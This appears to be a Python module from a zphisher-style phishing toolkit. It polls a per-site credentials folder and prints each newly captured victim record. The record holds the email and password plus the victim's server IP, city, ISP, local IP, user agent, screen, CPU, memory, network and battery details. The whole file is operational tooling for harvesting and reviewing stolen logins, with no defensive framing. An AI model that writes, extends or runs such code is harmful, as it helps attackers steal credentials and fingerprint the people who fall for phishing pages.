import os
import time
import json
from utils import CREDENTIALS_DIR

BOLD = '\033[1m'
GREEN = '\033[92m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'

def safe_get(d, key, default='N/A'):
    val = d.get(key, default)
    return str(val) if val is not None else default

def format_bool(b):
    return '✅' if b else '❌'

def display_zphisher_style(entry, filename):
    """Print the full credential dump with all possible data"""
    # If entry is list (old file), take last item
    if isinstance(entry, list):
        if not entry:
            return
        entry = entry[-1]

    # Extract main sections
    form_data = entry.get('form_data', {})
    browser_info = entry.get('browser_info', {})
    server_info = entry.get('server_info', {})
    server_geo = entry.get('server_geo', {})
    timestamp = entry.get('timestamp', 'N/A')
    session_id = entry.get('session_id', 'N/A')
    site = entry.get('site', 'N/A')

    # Credentials
    email = form_data.get('email') or form_data.get('username') or form_data.get('user') or 'N/A'
    password = form_data.get('pass') or form_data.get('password') or form_data.get('passwd') or 'N/A'

    # Client-side browser info
    ua = browser_info.get('userAgent', 'N/A')
    lang = browser_info.get('language', 'N/A')
    platform = browser_info.get('platform', 'N/A')
    timezone = browser_info.get('timezone', 'N/A')
    cookies = browser_info.get('cookiesEnabled', False)
    screen = browser_info.get('screen', {})
    screen_res = f"{screen.get('width', '?')}x{screen.get('height', '?')}"
    color_depth = screen.get('colorDepth', '?')
    hw = browser_info.get('hardware', {})
    mem = hw.get('deviceMemory', '?')
    cores = hw.get('cpuCores', '?')
    touch = hw.get('touchSupport', False)
    net = browser_info.get('network', {})
    net_type = net.get('type', '?')
    net_eff = net.get('effectiveType', '?')
    net_down = net.get('downlink', '?')
    net_rtt = net.get('rtt', '?')
    battery = browser_info.get('battery', {})
    batt_level = battery.get('level', '?')
    batt_charge = battery.get('charging', False)
    local_ip = browser_info.get('localIP', 'N/A')

    # Server side
    ip = server_info.get('ip', 'N/A')
    geo = server_geo
    country = geo.get('country', 'N/A')
    city = geo.get('city', 'N/A')
    region = geo.get('region', 'N/A')
    isp = geo.get('isp', 'N/A')
    org = geo.get('org', 'N/A')

    # ----- Print -----
    print(f"\n{BOLD}{GREEN}[+] NEW CREDENTIAL CAPTURED!{RESET}")
    print(f"    {CYAN}[*] Site      :{RESET} {site}")
    print(f"    {CYAN}[*] Time      :{RESET} {timestamp}")
    print(f"    {CYAN}[*] Session   :{RESET} {session_id}")
    print(f"    {CYAN}[*] Filename  :{RESET} {filename}")
    print(f"    {CYAN}[*] Email     :{RESET} {email}")
    print(f"    {CYAN}[*] Password  :{RESET} {password}")
    print(f"    {CYAN}[*] IP (SRV)  :{RESET} {ip}")
    print(f"    {CYAN}[*] Location  :{RESET} {city}, {region}, {country}")
    print(f"    {CYAN}[*] ISP       :{RESET} {isp}")
    print(f"    {CYAN}[*] Org       :{RESET} {org}")
    print(f"    {CYAN}[*] Local IP  :{RESET} {local_ip}")
    print(f"    {CYAN}[*] User Agent:{RESET} {ua[:80]}{'...' if len(ua)>80 else ''}")
    print(f"    {CYAN}[*] Language  :{RESET} {lang}")
    print(f"    {CYAN}[*] Platform  :{RESET} {platform}")
    print(f"    {CYAN}[*] Timezone  :{RESET} {timezone}")
    print(f"    {CYAN}[*] Cookies   :{RESET} {format_bool(cookies)}")
    print(f"    {CYAN}[*] Screen    :{RESET} {screen_res} ({color_depth}-bit)")
    print(f"    {CYAN}[*] CPU Cores :{RESET} {cores}")
    print(f"    {CYAN}[*] Memory    :{RESET} {mem} GB")
    print(f"    {CYAN}[*] Touch     :{RESET} {format_bool(touch)}")
    print(f"    {CYAN}[*] Network   :{RESET} {net_type} | {net_eff} | {net_down} Mbps | RTT {net_rtt}ms")
    print(f"    {CYAN}[*] Battery   :{RESET} {batt_level} (Charging: {format_bool(batt_charge)})")

def monitor_credentials(site_name):
    site_dir = os.path.join(CREDENTIALS_DIR, site_name)
    
    if not os.path.exists(site_dir):
        os.makedirs(site_dir, exist_ok=True)
    
    print(f"\n{BOLD}{CYAN}🔍 Monitoring for NEW credentials... (Ctrl+C to stop){RESET}")
    print(f"{YELLOW}Note: Every new capture will be printed instantly below{RESET}")
    
    processed_files = set()

    try:
        while True:
            current_files = set()
            if os.path.exists(site_dir):
                for f in os.listdir(site_dir):
                    # Exclude index and tracking files
                    if f.endswith('.json') and not ('index' in f or 'tracking' in f):
                        current_files.add(f)
            
            new_files = current_files - processed_files
            
            for filename in new_files:
                filepath = os.path.join(site_dir, filename)
                try:
                    with open(filepath, 'r', encoding='utf-8') as f:
                        entry = json.load(f)
                    
                    display_zphisher_style(entry, filename)
                    processed_files.add(filename)
                    
                except (json.JSONDecodeError, OSError):
                    # File still writing
                    pass
            
            time.sleep(1)
            
    except KeyboardInterrupt:
        print(f"\n{YELLOW}⏹️  Monitoring stopped.{RESET}")
        if os.path.exists(site_dir):
            total_files = len([f for f in os.listdir(site_dir) 
                             if f.endswith('.json') and not ('index' in f or 'tracking' in f)])
            print(f"{CYAN}📊 Total credentials captured: {total_files}{RESET}")
